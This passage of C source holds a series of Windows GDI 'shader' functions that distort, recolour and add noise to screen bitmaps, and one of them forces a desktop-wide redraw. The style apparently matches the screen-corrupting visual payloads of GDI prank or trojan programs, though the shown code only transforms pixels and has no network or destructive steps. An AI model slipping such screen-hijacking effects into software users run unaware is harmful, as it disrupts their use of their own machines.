			nNewBlockSize, nNewBlockSize, hdcTemp, x, y, nBlockSize, nBlockSize, SRCCOPY);
	}
}

VOID
WINAPI
GdiShader8(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	FLOAT div = (FLOAT)t / 1.f;
	FLOAT a = FastSine(div) * 2.f;
	FLOAT b = FastCosine(div) * 2.f;
	FLOAT f = 1.f / 4.f;
	RGBQUAD rgbDst;
	RGBQUAD rgbSrc;
	HSLCOLOR hsl;

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			u = x + (INT)a + (INT)(TriangleWave(y, t, h) * 8.f);
			v = y + (INT)b;

			Reflect2D((PINT)&u, (PINT)&v, w, h);

			rgbDst = prgbSrc[v * w + u];
			rgbSrc = prgbSrc[y * w + x];

			if (!rgbSrc.rgb)
			{
				rgbSrc.rgb = 1;
			}

			rgbDst.rgb &= rgbDst.rgb % ((rgbSrc.rgb << 18) + 1);
			FLOAT _r = (FLOAT)rgbDst.r * f + (FLOAT)rgbSrc.r * (3.f - f);
			FLOAT _g = (FLOAT)rgbDst.g * f + (FLOAT)rgbSrc.g * (14.f - f);
			FLOAT _b = (FLOAT)rgbDst.b * f + (FLOAT)rgbSrc.b * (10.f - f);
			rgbDst.rgb = ((BYTE)_b | ((BYTE)_g << 8) | ((BYTE)_r << 2));

			hsl = RGBToHSL(rgbDst);
			hsl.h = (FLOAT)fmod((DOUBLE)hsl.h + (DOUBLE)(x + y) / 100000.0 + 0.05, 1.0);
			hsl.s = 1.f;

			if (hsl.l < .3f)
			{
				hsl.l += .2f;
			}

			rgbDst = HSLToRGB(hsl);
			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
PostGdiShader6(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ RECT rcBounds,
	_In_ HDC hdcDst,
	_In_ HDC hdcTemp
)
{
	if (!(t % 32))
	{
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	}
	else
	{
		BitBlt(hdcDst, rcBounds.left, rcBounds.top, w, h, hdcTemp, 0, 0, SRCCOPY);
	}
}

VOID
WINAPI
GdiShader9(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	FLOAT div = (FLOAT)t / 15.f;
	FLOAT a = FastSine(div) * 4.f;
	FLOAT b = FastCosine(div) * 2.f;
	FLOAT f = 1.f / 3.f;
	RGBQUAD rgbDst;
	RGBQUAD rgbSrc;
	HSLCOLOR hsl;

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			u = x + (INT)a + (INT)(SawtoothWave(y, t, h) * 18.f);
			v = y + (INT)b;

			Reflect2D((PINT)&u, (PINT)&v, w, h);

			rgbDst = prgbSrc[v * w + u];
			rgbSrc = prgbSrc[y * w + x];

			if (!rgbSrc.rgb)
			{
				rgbSrc.rgb = 1;
			}

			rgbDst.rgb &= rgbDst.rgb % ((rgbSrc.rgb << 8) + 1);
			FLOAT _r = (FLOAT)rgbDst.r * f + (FLOAT)rgbSrc.r * (4.f - f);
			FLOAT _g = (FLOAT)rgbDst.g * f + (FLOAT)rgbSrc.g * (6.f - f);
			FLOAT _b = (FLOAT)rgbDst.b * f + (FLOAT)rgbSrc.b * (7.f - f);
			rgbDst.rgb = ((BYTE)_b | ((BYTE)_g << 8) | ((BYTE)_r << 6));

			hsl = RGBToHSL(rgbDst);
			hsl.h /= 1.0165f;
			hsl.s /= 1.0135f;
			hsl.l /= 1.0115f;
			rgbDst = HSLToRGB(hsl);

			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader10(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	FLOAT f = 1.f / 4.f;
	RGBQUAD rgbDst;
	RGBQUAD rgbSrc;
	HSLCOLOR hsl;

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			u = x + ((t + y) % 34) * -1;
			v = y + (t + x) % 54;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];
			rgbSrc = prgbSrc[y * w + x];

			FLOAT _r = (FLOAT)rgbDst.r * f + (FLOAT)rgbSrc.r * (1.f - f);
			FLOAT _g = (FLOAT)rgbDst.g * f + (FLOAT)rgbSrc.g * (1.f - f);
			FLOAT _b = (FLOAT)rgbDst.b * f + (FLOAT)rgbSrc.b * (1.f - f);
			rgbDst.rgb = (((BYTE)_b << 30) | ((BYTE)_g << 22) | ((BYTE)_r << 0));

			hsl = RGBToHSL(rgbDst);
			hsl.s = .5f;
			hsl.l *= 1.125f;

			if (hsl.l > .5f)
			{
				hsl.l -= .5f;
			}

			if (hsl.l < .25f)
			{
				hsl.l += .25f;
			}

			rgbDst = HSLToRGB(hsl);

			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader11(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	FLOAT f = 1.f / 4.f;
	RGBQUAD rgbDst;
	RGBQUAD rgbSrc;
	HSLCOLOR hsl;

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			u = x + y / (h / 19);
			v = y + u / (w / 1);
			u = x + v / (h / 13);

			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];
			rgbSrc = prgbSrc[y * w + x];

			FLOAT _r = (FLOAT)rgbDst.r * f + (FLOAT)rgbSrc.r * (14.f - f);
			FLOAT _g = (FLOAT)rgbDst.g * f + (FLOAT)rgbSrc.g * (12.f - f);
			FLOAT _b = (FLOAT)rgbDst.b * f + (FLOAT)rgbSrc.b * (1.f - f);
			rgbDst.rgb = ((BYTE)_b | ((BYTE)_g << 8) | ((BYTE)_r << 16));

			hsl = RGBToHSL(rgbDst);

			if (hsl.s < .5f)
			{
				hsl.s = .5f;
			}

			if ((roundf(hsl.h * 10.f) / 10.f) != (roundf((FLOAT)((Xorshift32() + t) % 257) / 6.f * 14.f) / 10.f))
			{
				hsl.h = (FLOAT)fmod((DOUBLE)hsl.h + .1, 1.0);
			}
			else
			{
				hsl.h = (FLOAT)fmod((DOUBLE)hsl.h + .19, 1.0);
			}

			rgbDst = HSLToRGB(hsl);

			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader12(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for (INT y = 0; y < h; y++)
	{
		FLOAT a = SquareWave(t + y, t, h) * 11000000.f;

		for (INT x = 0; x < w; x++)
		{
			u = x + (INT)a;
			v = y;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];
			rgbDst.rgb = ((rgbDst.b - 1) | ((rgbDst.g + 1) << 8) | ((rgbDst.r - 2) << 24));
			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader13(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for (INT y = 0; y < h; y++)
	{
		FLOAT a = TriangleWave(t * 4 + y, 10, h) * 19.f;

		for (INT x = 0; x < w; x++)
		{
			u = x + (INT)a;
			v = y;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];
			rgbDst.rgb = ((rgbDst.b + 1) | ((rgbDst.g + 1) << 8) | ((rgbDst.r + 1) << 13));
			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader14(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for (INT y = 0; y < h; y++)
	{
		FLOAT a = FastSine(2 * 1 + 3) * 1.f;

		for (INT x = 0; x < w; x++)
		{
			u = x + (INT)a;
			v = y;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];
			rgbDst.rgb = ((rgbDst.b + (t)) | ((rgbDst.g + (t)) << t) | ((rgbDst.r + (x & y)) << 1));
			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader15(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			FLOAT a = coshf(atan2f((FLOAT)((y * t - 3) & t), (FLOAT)((13 * 32) & t))) * log10f((FLOAT)(t | 6 - 3)) * 2.f;
			FLOAT b = expf((FLOAT)acos((DOUBLE)t / 1.0) + t);

			u = x + (INT)a;
			v = y + (INT)b;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];
			rgbDst.rgb = ((rgbDst.b ^ rgbDst.g << t) | ((rgbDst.g ^ rgbDst.r) << 6) | ((rgbDst.r ^ rgbDst.b) << t));
			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader16(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			FLOAT a = sinhf(atanf((FLOAT)(((t + x) * 12 - 3) & t))) * logf((FLOAT)(t | 13 - 68)) * 3 - 1.f;
			FLOAT b = expf((FLOAT)asin((DOUBLE)t / tanh(1.0)) + (FLOAT)(x + y));

			u = x + (INT)a;
			v = y - (INT)b;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];
			rgbDst.rgb = ((rgbDst.b | rgbDst.g) | ((rgbDst.g | rgbDst.r) << 24) | ((rgbDst.r) << t));
			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader17(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for (INT y = 0; y < h; y++)
	{
		for (INT x = 0; x < w; x++)
		{
			FLOAT a = (FLOAT)ldexp((DOUBLE)atanf((FLOAT)(((t + x) * 16) & t)), t + y) * (FLOAT)scalbn((DOUBLE)(t | 25), x & y * 64) * 22.f;
			FLOAT b = (FLOAT)expm1((DOUBLE)sqrtf(t * (FLOAT)hypot(10.0, (DOUBLE)(t % 20))) + (DOUBLE)(x | y));

			u = x + (INT)b;
			v = y + (INT)a;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];
			HSLCOLOR hsl = RGBToHSL(rgbDst);
			hsl.h = (FLOAT)fmod((DOUBLE)rgbDst.r / 25.0 + (DOUBLE)t / 18.0, 1.0);
			hsl.s = (FLOAT)rgbDst.g / 255.f;
			hsl.l = (FLOAT)rgbDst.b / 55.f;
			rgbDst = HSLToRGB(hsl);
			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader18(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	RGBQUAD rgbDst;
	FLOAT c = 1.f / 8.f;
	BYTE d;

	for (INT y = 0; y < h; y++)
	{
		FLOAT a = TriangleWave(t * 8 + y / 7, 2, w) * SquareWave(t * 8 + y / 7, 7, h) * 4.f;

		for (INT x = 0; x < w; x++)
		{
			FLOAT b = TriangleWave(t * 8 + x / 2, 2, w) * SquareWave(t * 8 + y / 7, 2, h) * 4.f;

			u = x + (INT)a;
			v = y + (INT)b;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];
			rgbDst.r = (BYTE)((FLOAT)rgbDst.r * c + (a * b) * (1.f - c));
			rgbDst.g += rgbDst.r / 36;

			d = rgbDst.b;

			if (!d)
			{
				d = 1;
			}

			rgbDst.b += rgbDst.r / d;

			HSLCOLOR hsl = RGBToHSL(rgbDst);
			hsl.h = (FLOAT)fmod((DOUBLE)hsl.h + .01, 1.0);
			hsl.s = (FLOAT)fmod((DOUBLE)(hsl.s + hsl.h) + .01, 1.0);
			hsl.l = (FLOAT)fmod((DOUBLE)(hsl.l + hsl.h) + .01, 1.0);
			rgbDst = HSLToRGB(hsl);

			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader19(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for (INT y = 0; y < h; y++)
	{
		FLOAT a = FastSine((FLOAT)t / 1.f + (FLOAT)y / 60.f) * 8.f;

		for (INT x = 0; x < w; x++)
		{
			u = x + 0 + (INT)a;
			v = y;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];
			rgbDst.rgb += (COLORREF)(__rdtsc() & 0b1000000010000000 & (__rdtsc() & 0b100000001000000010000000));
			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader20(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	HSLCOLOR hsl;
	hsl.h = (FLOAT)fmod((DOUBLE)t / 512.0, 1.0);
	hsl.s = 1.f;
	hsl.l = .5f;
	COLORREF crRainbow = HSLToRGB(hsl).rgb;

	for (INT y = 0; y < h; y++)
	{
		FLOAT a = FastSine((FLOAT)1 / 26.f + (FLOAT)y / 34.f) * 18.f;

		for (INT x = 0; x < w; x++)
		{
			u = x + (INT)a;
			v = y ^ (y % (abs((INT)(a * a)) + 1));

			Reflect2D((PINT)&u, (PINT)&v, w, h);

			rgbDst = prgbSrc[v * w + u];
			rgbDst.rgb &= crRainbow;

			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader21(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for (INT y = 0; y < h; y++)
	{
		HSLCOLOR hsl;
		hsl.h = (FLOAT)fmod((DOUBLE)t / 15.0 + (DOUBLE)y / (DOUBLE)h * 1.f, 1.0);
		hsl.s = 1.f;
		hsl.l = .5f;
		COLORREF crRainbow = HSLToRGB(hsl).rgb;

		FLOAT a = FastSine((FLOAT)t / 1.f + (FLOAT)y / 60.f) * 8.f;

		for (INT x = 0; x < w; x++)
		{
			u = (INT)(x * fabs(fmod((DOUBLE)a - (DOUBLE)(INT)(a * a), 1.0))) + x;
			v = y + (INT)(a * a);

			Reflect2D((PINT)&u, (PINT)&v, w, h);

			rgbDst = prgbSrc[v * w + u];
			rgbDst.rgb = rgbDst.rgb & 0xAAAAA;
			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader22(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);

	UINT u;
	UINT v;
	RGBQUAD rgbDst;
	HSLCOLOR hsl;
	FLOAT _t = (FLOAT)t / 1.f;

	for (INT y = 0; y < h; y++)
	{
		FLOAT _y = (FLOAT)y / 2.f;

		for (INT x = 0; x < w; x++)
		{
			FLOAT a = FastCosine(_y + _t) * 9.f;

			u = x + (INT)a, v = y;
			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];
			FLOAT r = (FLOAT)prgbSrc[y * w + x].r;
			FLOAT g = (FLOAT)prgbSrc[y * w + x].g;
			FLOAT b = (FLOAT)prgbSrc[y * w + x].b;

			//rgbDst.rgb = (COLORREF)0;
			hsl = RGBToHSL(rgbDst);
			hsl.h = (FLOAT)fmod((DOUBLE)hsl.h + 1.0 / 45.0 + ((FLOAT)x + (FLOAT)y) / (((FLOAT)w + (FLOAT)h) * 64.f), 1.0);
			prgbDst[y * w + x] = HSLToRGB(hsl);
		}
	}
}

VOID
WINAPI
GdiShader23(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for (INT y = 0; y < h; y++)
	{
		FLOAT a = FastSine((FLOAT)t / 8.f + (FLOAT)y / 64.f) * 4.f;

		for (INT x = 0; x < w; x++)
		{
			u = x + t + (INT)a;
			v = y + t + (INT)a;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];
			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader24(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(t);
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);
	UNREFERENCED_PARAMETER(prgbSrc);

	RGBQUAD rgbDst;

	for (INT y = 0; y < h; y++)
	{
		FLOAT a = FastSine((FLOAT)t / 100.f + (FLOAT)y / 10.f) * 9.f;
		for (INT x = 0; x < w; x++)
		{
			INT u = x + 0 + (INT)a;
			INT v = y;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[v * w + u];

			rgbDst.rgb = ((rgbDst.b - 1) | ((rgbDst.g + 1) << 10) | ((rgbDst.r - 2) << 1));

			prgbDst[y * w + x] = rgbDst;
		}
	}
}

VOID
WINAPI
FinalGdiShader(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER(t);
	UNREFERENCED_PARAMETER(hdcTemp);
	UNREFERENCED_PARAMETER(hbmTemp);
	UNREFERENCED_PARAMETER(prgbSrc);

	RGBQUAD rgbDst;

	for (INT i = 0; i < w * h; i += w)
	{
		rgbDst.rgb = (Xorshift32() % 256) * 0x010101;

		for (INT j = 0; j < w; j++)
		{
			prgbDst[i + j] = rgbDst;
		}
	}
}